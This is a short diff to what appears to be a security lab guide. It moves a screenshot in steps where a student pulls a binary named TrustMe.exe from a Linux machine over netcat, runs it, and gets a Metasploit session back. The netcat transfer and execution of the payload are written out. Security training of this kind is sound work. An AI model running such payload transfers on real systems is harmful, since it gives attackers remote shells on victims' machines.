@@ -85,15 +85,15 @@ Once the prompt is open, let's run the following commands to copy over and run t
 
 `nc <Your Linux IP> 2222 > TrustMe.exe`
 
-It should look like this:
-
-![](attachments/TrustMe.png)
-
 Take a deep breath.  Count to 5.  Then hit Ctrl+c to kill the connection.
 
 Then, run it.
 
 `TrustMe.exe`
+
+It should look like this:
+
+![](attachments/TrustMe.png)
 
 Back at your Ubuntu prompt, you should have a metasploit session.
 
